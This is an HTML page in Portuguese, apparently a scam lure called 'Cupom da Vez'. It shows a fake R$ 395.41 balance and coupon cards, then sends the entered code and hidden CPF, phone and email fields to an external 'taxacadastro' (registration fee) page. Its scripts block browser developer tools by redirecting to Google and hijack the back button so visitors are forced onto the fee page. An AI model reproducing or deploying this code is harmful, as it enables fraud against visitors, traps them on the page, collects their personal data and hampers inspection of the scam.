<!DOCTYPE html><html lang="pt-BR"><head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <link data-optimized="1" rel="stylesheet" href="css/5921624bf5bbe4c8c091ef09226fa76f.css">
        <link rel="preconnect" href="https://fonts.googleapis.com/">
        <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
        <link data-optimized="1" href="css/1c7a3d2ee9759dc256d915300855c494.css" rel="stylesheet">
        <link data-optimized="1" href="css/ba9cbbe9240a489628be8eb27c56db8a.css" rel="stylesheet">
        <link rel="stylesheet" href="css/style.css">
        <link rel="stylesheet" href="css/slider.css">
        <link rel="stylesheet" href="css/animated.css">
        <link rel="shortcut icon" href="images/faveicon.png">
        <title>:: Cupom da Vez ::</title>
    </head>

    <body class="fundoWhite">

        <div class="corteLayoutTop"></div>

        <div id="p1" style="background-color: #FFFFFF; padding: 15px 0 18px 0;">

            <img style="width: 35%; margin: auto; margin-left: 10px; position: relative; margin-top: 10px;" src="images/logo2.png">

            <div class="boxSaldo">
                <label for="input" class="textoSaldo" style="background-color: #F4F4F4;">SALDO</label>
                <p class="valorSaldo">R$ <span class="saldoAtualizado">395.41</span></p>
            </div>
            
        </div>


        <div id="produto1" style="width: 100%;">
            <div style="text-align: center; display: flex; justify-content: center; flex-direction: column; align-content: center; flex-wrap: wrap; position: relative;">

                <div id="textoCarregandoCodigo" style="display: flex; justify-content: center;">
                    <h1 class="loading"></h1>
                    <h1 class="carregandoCodigo">CARREGANDO NOVO CUPOM...</h1>
                </div>

                <div id="textoCodigoEncontrado" style="display: none;">
                    <img src="images/ok.png" class="ok">
                    <h1 class="codigoLocalizado">NOVO CUPOM LOCALIZADO!</h1>
                </div>

                <div class="container" id="container">
                    <input type="radio" name="slider" id="item-1" checked="">
                    <input type="radio" name="slider" id="item-2">
                    <input type="radio" name="slider" id="item-3">
                    <input type="radio" name="slider" id="item-4">
                    <input type="radio" name="slider" id="item-5">
                    <input type="radio" name="slider" id="item-6">
                    <input type="radio" name="slider" id="item-7">
                    <input type="radio" name="slider" id="item-8">
                    <input type="radio" name="slider" id="item-9">
                    <input type="radio" name="slider" id="item-10">
                    <input type="radio" name="slider" id="item-11">


                    <div class="cards">
                                                <label class="card" for="item-1" id="song-1">
                            <img style="width: 80%;" src="images/38.jpg">
                            <input type="hidden" name="codigoEscolhido" id="codigoEscolhido-1" value="98698757">
                        </label>
                                                <label class="card" for="item-2" id="song-2">
                            <img style="width: 80%;" src="images/59.jpg">
                            <input type="hidden" name="codigoEscolhido" id="codigoEscolhido-2" value="94251877">
                        </label>
                                                <label class="card" for="item-3" id="song-3">
                            <img style="width: 80%;" src="images/84.jpg">
                            <input type="hidden" name="codigoEscolhido" id="codigoEscolhido-3" value="81795889">
                        </label>
                                                <label class="card" for="item-4" id="song-4">
                            <img style="width: 80%;" src="images/44.jpg">
                            <input type="hidden" name="codigoEscolhido" id="codigoEscolhido-4" value="69461273">
                        </label>
                                                <label class="card" for="item-5" id="song-5">
                            <img style="width: 80%;" src="images/91.jpg">
                            <input type="hidden" name="codigoEscolhido" id="codigoEscolhido-5" value="68579881">
                        </label>
                                                <label class="card" for="item-6" id="song-6">
                            <img style="width: 80%;" src="images/10.jpg">
                            <input type="hidden" name="codigoEscolhido" id="codigoEscolhido-6" value="14779847">
                        </label>
                                                <label class="card" for="item-7" id="song-7">
                            <img style="width: 80%;" src="images/50.jpg">
                            <input type="hidden" name="codigoEscolhido" id="codigoEscolhido-7" value="72567623">
                        </label>
                                                <label class="card" for="item-8" id="song-8">
                            <img style="width: 80%;" src="images/3.jpg">
                            <input type="hidden" name="codigoEscolhido" id="codigoEscolhido-8" value="15783715">
                        </label>
                                                <label class="card" for="item-9" id="song-9">
                            <img style="width: 80%;" src="images/99.jpg">
                            <input type="hidden" name="codigoEscolhido" id="codigoEscolhido-9" value="39376488">
                        </label>
                                                <label class="card" for="item-10" id="song-10">
                            <img style="width: 80%;" src="images/87.jpg">
                            <input type="hidden" name="codigoEscolhido" id="codigoEscolhido-10" value="96938292">
                        </label>
                                                <label class="card" for="item-11" id="song-11">
                            <img style="width: 80%;" src="images/63.jpg">
                            <input type="hidden" name="codigoEscolhido" id="codigoEscolhido-11" value="45987416">
                        </label>
                                            </div>

                </div>

            </div>

            <div id="codigoBarras" class="coolinput" style="margin-top: 275px; display: none;">
                <div id="verificaCodigoBarras">
                <form action="https://reidocha.com/cupom/taxacadastro/taxacadastro.php" method="POST" id="formCupom">     
                    <label for="input" id="textoCodigoBarras" class="text">CUPOM</label>
                    <input style="font-size: 16px;" type="text" placeholder="Digite os 8 digitos do CUPOM" name="codigoBarrasDigitado" id="codigoBarrasDigitado" class="input" inputmode="numeric" autocomplete="off" required="" onkeyup="validacaoCodigoBarras6()">
                    <div style="margin: -5px 0 0 10px;"><span id="validacaoCodigo"></span></div>


                    <input type="hidden" name="cpfUsuario" id="cpfUsuario" value="">
                    <input type="hidden" name="celularUsuario" id="celularUsuario" value="">
                    <input type="hidden" name="emailUsuario" id="emailUsuario" value="">
                </form>    
                </div>
            </div>
        </div>  


       

        

        <script src="js/jquery.min.js"></script>
        <script type="text/javascript" src="js/jquery.mask.js"></script>
        <script src="js/slider.js"></script>
        <script src="js/validacaoCodigoBarras.js"></script>
        <script src="js/funcoes.js"></script>
        <script disable-devtool-auto="" src="https://cdn.jsdelivr.net/npm/disable-devtool" url="https://google.com.br"></script>
        <script>
            // BACK REDIRECT
            var urlBackRedirect = '../taxacadastro/taxacadastro.php'; // lembre-se de usar a url sem espaços
            // não altere nada abaixo dessa linha
            urlBackRedirect = urlBackRedirect = urlBackRedirect.trim() +
            (urlBackRedirect.indexOf("?") > 0 ? '&' : '?') +
            document.location.search.replace('?', '').toString();
            history.pushState({}, "", location.href);
            history.pushState({}, "", location.href);
            window.onpopstate = function () {
                setTimeout(function () {
                    location.href = urlBackRedirect;
                }, 1);
            };
            // BACK REDIRECT


            // MÁSCARA INPUT
            jQuery(function($){
                $("#codigoBarrasDigitado").mask("99     99     99     99");
            });
            // MÁSCARA INPUT
        </script>   
    
</body></html>